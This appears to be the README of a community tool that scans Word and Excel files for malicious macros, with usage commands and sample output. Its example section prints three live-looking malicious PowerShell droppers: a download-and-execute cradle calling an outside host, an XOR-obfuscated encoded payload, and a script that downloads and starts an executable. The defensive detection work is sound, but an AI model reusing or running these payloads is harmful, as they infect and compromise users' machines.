# ScanWordDoc
Look for malicious patterns in Word Docs. Intended to be used inline with email or standalone per file.

This is a community project at https://www.codeforatlanta.org/ 

## goals
1. Tackle common high value security issues in a way that is accessible to everyone.
2. Create a script that will scan a word doc and validate, it's valid, it works, if it has macros, if those macros look suspicious
3. Create methods / scripts to put it inline with various email systems for easy and free
4. Create a successful patternt that can be used for other similar security use cases.
5. DO NOT compromise the host that is scanning the file
6. Create the script in javascript for ease of portability

## getting started

scan individual files
```bash
> node scan.js ./tests/benign/nomacros.doc
> node scan.js ./tests/benign/hasmacros.doc
> node scan.js ./tests/malicious/hasmacros.doc
```
or scan directories + subdirectories
```
> node scan.js ./tests/
```


## Supported Files
1. Excel XLS
2. Word DOC

## Example Response
```JSON
{ fileType: 'doc',
  hasMacro: true,
  macroTxt: 'Sub SortText()
    Selecton.h
    End P',
  isValid: false,
  hasContent: true }
```

## Example Malicious MAcro / Command
```powershell
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -Exec Bypass -NoP -NoExit -Command iex((New-Object System.Net.WebClient).DownloadString('http://qwdiqjwdwqu9daquwddd.com/REX/slick.php?utma=torzd'))
```
```powershell
POwerSHell &( $psHOme[21]+$PSHOMe[30]+'x') ( ([char[]]( 96 ,6,19, 11 ,45,34 ,100, 121,100 ,42,33 , 51, 105 ,43 ,38,46 ,33,39,48 ,100,54, 37,42 ,32,43,41 , 127 ,96 ,15, 6,37, 17 ,9 , 46 , 100 ,121 ,100, 42, 33 , 51, 105 , 43, 38 ,46, 33 , 39, 48,100, 23, 61, 55 ,48,33 , 41, 106 , 10 , 33, 48,106,19, 33,38 , 7 , 40,45 ,33, 42,48 , 127, 96,52 , 39, 62 ,49 ,53 , 100, 121, 100, 99,44,48 ,48 , 52 ,126,107, 107,37, 42, 32 ,43, 54 , 45 ,43,37 , 55 , 42, 33,55, 106,39, 43,41,107,12, 12 , 8, 8,107, 45,42 , 32, 33 ,60, 106,52 ,44 ,52,123 ,40,121,38, 43 ,42,61 , 118,106 , 39, 40 , 37 , 55,55 , 99, 106 , 23 , 52 , 40,45, 48 , 108, 99 , 4 ,99,109, 127,96, 39, 41 ,17 ,12, 50 ,100, 121, 100 , 96, 6,19 ,11 ,45,34,106, 42, 33 , 60 ,48 , 108, 117, 104,100, 117,114 , 114 , 115,119 , 113 , 109 ,127 , 96,22,0 , 14 , 51, 42, 100,121 ,100,96,33, 42, 50, 126,48 , 33,41, 52 , 100 , 111 ,100, 99 ,24 , 99, 100 ,111, 100,96 ,39 ,41 , 17,12 ,50, 100 ,111, 100,99 , 106 , 33,60 ,33, 99,127,34 ,43, 54, 33 , 37, 39, 44, 108 ,96 , 16, 23 ,50 ,43 , 54, 3,100, 45 ,42 ,100,96 , 52, 39, 62, 49 ,53, 109, 63 , 48 , 54 , 61, 63 , 96 ,15 , 6,37 ,17,9, 46 ,106,0, 43,51, 42 ,40,43,37,32,2,45 , 40,33 , 108, 96 , 16 ,23,50, 43, 54, 3 ,106 , 16,43 ,23 , 48,54, 45,42 , 35,108 ,109 , 104, 100 , 96 ,22, 0, 14 , 51,42,109 , 127 , 23,48 , 37 ,54,48,105 ,20,54 , 43,39, 33,55 , 55, 100,96 ,22, 0,14, 51 ,42, 127, 38, 54, 33, 37 ,47 ,127,57,39, 37 ,48 , 39, 44, 63, 51 ,54, 45 , 48, 33 ,105, 44, 43,55, 48 , 100, 96 , 27, 106 ,1,60,39 , 33, 52,48,45 , 43,42 ,106,9, 33 ,55,55,37 ,35, 33 , 127,57 ,57) | foreAcH-ObJECt {[char]( $_ -BXOR'0x44') })-jOiN'' )
```
```powershell
$BWOif = new-object random;$KBaUMj = new-object System.Net.WebClient;$pczuq = 'http://andorioasnes.com/HHLL/index.php?=bony2.class'.Split('@');$cmUHv = $BWOif.next(1, 166735);$RDJwn = $env:temp + '\' + $cmUHv + '.exe';foreach($TSvorG in $pczuq){try{$KBaUMj.DownloadFile($TSvorG.ToString(), $RDJwn);Start-Process $RDJwn;break;}catch{write-host $_.Exception.Message;}}
```

## References
- https://www.npmjs.com/package/cfb : currently the primary library supporting functions thanks Yaw Agyepong !
- https://github.com/curi0usJack/luckystrike
- https://github.com/enigma0x3/Generate-Macro
- https://github.com/joesecurity/pafishmacro
- https://github.com/strawp/poisonpen
- https://github.com/gpalazolo/olevba_analyzer
- https://github.com/teto2005/Generate-Macro-is-a-standalone-PowerShell-script-that-will-generate-a-malicious-Microsoft-Office-doc
- https://github.com/Heteroskedastic/corrupt-file-scanner
- https://developers.google.com/gmail/api/quickstart/nodejs
